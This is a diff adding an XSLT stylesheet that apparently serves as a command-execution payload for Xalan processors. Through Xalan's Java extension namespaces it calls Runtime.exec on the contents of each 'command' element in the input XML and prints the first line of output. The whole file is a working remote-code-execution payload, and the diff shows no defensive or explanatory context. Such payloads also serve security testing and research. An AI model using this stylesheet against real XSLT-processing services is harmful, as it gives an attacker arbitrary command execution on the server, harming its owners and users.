@@ -1,0 +1,19 @@
+<?xml version="1.0"?>
+<xsl:stylesheet exclude-result-prefixes="java" version="1.0"
+ xmlns:bufferedreader="xalan://java.io.BufferedReader"
+ xmlns:inputstreamreader="xalan://java.io.InputStreamReader"
+ xmlns:java="http://xml.apache.org/xalan/java"
+ xmlns:process="xalan://java.lang.Process"
+ xmlns:runtime="xalan://java.lang.Runtime"
+ xmlns:xsl="http://www.w3.org/1999/XSL/Transform">
+  <xsl:variable name="runtime" select="runtime:getRuntime()"/>
+  <xsl:template match="//command">
+      <xsl:variable name="process" select="runtime:exec($runtime, string(.))"/>
+      <xsl:variable name="inputstream" select="process:getInputStream($process)"/>
+      <xsl:variable name="inputstreamreader" select="inputstreamreader:new($inputstream)"/>
+      <xsl:variable name="bufferedreader" select="bufferedreader:new($inputstreamreader)"/>
+      <p>
+        Output: <xsl:value-of select="bufferedreader:readLine($bufferedreader)"/><br/>
+      </p>
+  </xsl:template>
+</xsl:stylesheet>
